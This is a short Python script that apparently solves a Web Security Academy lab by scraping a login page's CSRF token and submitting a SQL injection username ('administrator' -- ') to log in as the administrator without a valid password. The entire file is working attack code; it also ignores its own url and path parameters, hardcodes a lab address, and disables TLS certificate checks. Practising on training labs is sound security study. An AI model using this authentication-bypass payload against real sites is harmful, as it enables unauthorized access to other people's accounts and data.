import requests
from bs4 import BeautifulSoup
def solve(url,path="login"):
 # Target URL
 base_url = "https://0ad700ab04e214f480591cad0010007c.web-security-academy.net"
 login_url = base_url + "/login"
 # Create a session to persist cookies
 session = requests.Session()
 # Step 1: Get the CSRF token from the login page
 response = session.get(login_url, verify=False)
 soup = BeautifulSoup(response.text, "html.parser")
 # Extract CSRF token from input field
 csrf_token = soup.find("input", {"name": "csrf"})
 if csrf_token:
    csrf_token = csrf_token["value"]
    print(f"[+] Found CSRF token: {csrf_token}")
 else:
    print("[-] CSRF token not found. Exiting.")
    exit()
 # Step 2: Perform the SQL Injection attack
 payload = {
    "csrf": csrf_token,
    "username": "administrator' -- ",
    "password": "anyPassword"
 }

 # Send the POST request with CSRF token
 response = session.post(login_url, data=payload, verify=False)
 # Step 3: Check if login was successful
 print(f"Status Code: {response.status_code}")
 if "Your username is: administrator" in response.text:
    print("[+] Injection successful! Logged in as admin.")
 else:
    print("[-] Injection failed.")
#https://0ae700be049cfce18390e9b6003b0001.web-security-academy.net/filter?category=
